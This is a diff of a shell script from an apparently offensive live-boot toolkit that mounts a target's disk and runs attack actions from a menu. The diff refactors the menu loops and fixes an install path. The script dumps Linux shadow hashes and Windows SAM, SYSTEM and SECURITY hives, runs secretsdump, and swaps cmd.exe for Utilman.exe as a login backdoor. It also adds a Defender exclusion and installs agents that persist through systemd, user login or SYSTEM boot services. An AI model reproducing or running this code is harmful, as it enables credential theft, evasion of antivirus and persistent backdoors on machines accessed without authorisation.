@@ -48,7 +48,7 @@ function linux_hashcat_exp() {
     else
         MODE="1800"  # SHA-512
     fi
-    echo $HASHES > $LOOT_FOLDER/hashcat/hash.$MODE
+    grep -E '^\w+:\$[6y]\$' /mnt/etc/shadow | cut -d: -f2 > $LOOT_FOLDER/hashcat/hash.$MODE
 }
 
 function linux_systemd_infect_exp() {
@@ -56,24 +56,31 @@ function linux_systemd_infect_exp() {
     [ ! -d /mnt/etc/systemd/system/multi-user.target.wants ] && mkdir -p /mnt/etc/systemd/system/multi-user.target.wants/
     cp -r /home/p4p1-live/loot/agent.elf /mnt/usr/local/bin/agent
     chmod +x /mnt/usr/local/bin/agent
-    cp -r /etc/p3ng0s/os_killer/infect.service /mnt/systemd/system/infect.service
+    cp -r /etc/p3ng0s/os_killer/infect.service /mnt/etc/systemd/system/infect.service
     ln -sf /etc/systemd/system/infect.service /mnt/etc/systemd/system/multi-user.target.wants/infect.service
 }
 
 function linux_exp() {
-    SEL=$(dialog --title "What are you looking for?" \
-        --menu "...." 20 70 15 \
-        1 "dump passwd & shadow" \
-        2 "chroot :)" \
-        3 "Dump the hashes to then hashcat them ^^" \
-        4 "Systemd infect" \
-        5 "Leave script" \
-        2>&1 >/dev/tty)
-    [ $SEL = 1 ] && $(cp -r /mnt/etc/passwd $LOOT_FOLDER/passwd; cp -r /mnt/etc/shadow $LOOT_FOLDER/shadow)
-    [ $SEL = 2 ] && chroot /mnt
-    [ $SEL = 3 ] && linux_hashcat_exp
-    [ $SEL = 4 ] && linux_systemd_infect_exp
-    [ $SEL = 5 ] && leave
+    while true; do
+        SEL=$(dialog --title "What are you looking for?" \
+            --menu "...." 20 70 15 \
+            1 "dump passwd & shadow" \
+            2 "chroot :)" \
+            3 "Dump the hashes to then hashcat them ^^" \
+            4 "Systemd infect" \
+            2>&1 >/dev/tty)
+        EXIT_STATUS=$?
+
+        if [ $EXIT_STATUS -ne 0 ]; then
+            echo "Exiting..."
+            break
+        fi
+
+        [ $SEL = 1 ] && $(cp -r /mnt/etc/passwd $LOOT_FOLDER/passwd; cp -r /mnt/etc/shadow $LOOT_FOLDER/shadow)
+        [ $SEL = 2 ] && chroot /mnt
+        [ $SEL = 3 ] && linux_hashcat_exp
+        [ $SEL = 4 ] && linux_systemd_infect_exp
+    done
 
     echo -e "\e[1;31m[!]\e[m All of the ouput and results are inside of $LOOT_FOLDER :)"
     sleep 1
@@ -111,25 +118,32 @@ function windows_boot_service_exp() {
 }
 
 function windows_exp() {
-    SEL=$(dialog --title "What are you looking for?" \
-        --menu "...." 20 70 15 \
-        1 "Dump SAM/SYSTEM/SECURITY/SOFTWARE ^^" \
-        2 "Swap cmd.exe and utilman.exe" \
-        3 "Secrets dump me baby right now" \
-        4 "Dump the hashes to then hashcat them ^^" \
-        5 "Create defender exclusion path in C:\\Windows\\Tasks\\p3ng0s\\" \
-        6 "Install agent.exe to run on user login" \
-        7 "Install agent.svc.exe to run on boot as NT Authority/System" \
-        8 "Leave script" \
-        2>&1 >/dev/tty)
-    [ $SEL = 1 ] && $(cp -r /mnt/Windows/System32/config/SAM $LOOT_FOLDER/SAM ; cp -r /mnt/Windows/System32/config/SYSTEM $LOOT_FOLDER/SYSTEM; cp -r /mnt/Windows/System32/config/SECURITY $LOOT_FOLDER/SECURITY; cp -r /mnt/Windows/System32/config/SOFTWARE $LOOT_FOLDER/SOFTWARE)
-    [ $SEL = 2 ] && cp -r /mnt/Windows/System32/cmd.exe /mnt/Windows/System32/Utilman.exe
-    [ $SEL = 3 ] && /opt/pentest/impacket/bin/secretsdump.py -sam /mnt/Windows/System32/config/SAM -system /mnt/Windows/System32/config/SYSTEM -security /mnt/Windows/System32/config/SECURITY LOCAL | tee >(cat) > $LOOT_FOLDER/secretsdump.log
-    [ $SEL = 4 ] && windows_hashcat_exp
-    [ $SEL = 5 ] && windows_exclusion_path_exp
-    [ $SEL = 6 ] && windows_user_login_exp
-    [ $SEL = 7 ] && windows_boot_service_exp
-    [ $SEL = 8 ] && leave
+    while true; do
+        SEL=$(dialog --title "What are you looking for?" \
+            --menu "...." 20 70 15 \
+            1 "Dump SAM/SYSTEM/SECURITY/SOFTWARE ^^" \
+            2 "Swap cmd.exe and utilman.exe" \
+            3 "Secrets dump me baby right now" \
+            4 "Dump the hashes to then hashcat them ^^" \
+            5 "Create defender exclusion path in C:\\Windows\\Tasks\\p3ng0s\\" \
+            6 "Install agent.exe to run on user login" \
+            7 "Install agent.svc.exe to run on boot as NT Authority/System" \
+            2>&1 >/dev/tty)
+        EXIT_STATUS=$?
+
+        if [ $EXIT_STATUS -ne 0 ]; then
+            echo "Exiting..."
+            break
+        fi
+
+        [ $SEL = 1 ] && $(cp -r /mnt/Windows/System32/config/SAM $LOOT_FOLDER/SAM ; cp -r /mnt/Windows/System32/config/SYSTEM $LOOT_FOLDER/SYSTEM; cp -r /mnt/Windows/System32/config/SECURITY $LOOT_FOLDER/SECURITY; cp -r /mnt/Windows/System32/config/SOFTWARE $LOOT_FOLDER/SOFTWARE)
+        [ $SEL = 2 ] && cp -r /mnt/Windows/System32/cmd.exe /mnt/Windows/System32/Utilman.exe
+        [ $SEL = 3 ] && /opt/pentest/impacket/bin/secretsdump.py -sam /mnt/Windows/System32/config/SAM -system /mnt/Windows/System32/config/SYSTEM -security /mnt/Windows/System32/config/SECURITY LOCAL | tee >(cat) > $LOOT_FOLDER/secretsdump.log
+        [ $SEL = 4 ] && windows_hashcat_exp
+        [ $SEL = 5 ] && windows_exclusion_path_exp
+        [ $SEL = 6 ] && windows_user_login_exp
+        [ $SEL = 7 ] && windows_boot_service_exp
+    done
 
     echo -e "\e[1;31m[!]\e[m All of the ouput and results are inside of $LOOT_FOLDER :)"
     sleep 1
@@ -143,11 +157,8 @@ function select_os() {
         1 "Windows" \
         2 "Linux" \
         2>&1 >/dev/tty)
-    while [ True ]; do
-        [ $OS_SEL = 1 ] && windows_exp
-        [ $OS_SEL = 2 ] && linux_exp
-	[ -z $SEL ] && leave
-    done
+    [ $OS_SEL = 1 ] && windows_exp
+    [ $OS_SEL = 2 ] && linux_exp
 }
 
 function encryption_check() {
@@ -243,6 +254,7 @@ else
     select_os
 fi
 
+umount /mnt
 echo -e "\e[1;32m[*]\e[m you will now be booting in the gui environement if run at startup ^^"
 sleep 5
 exit
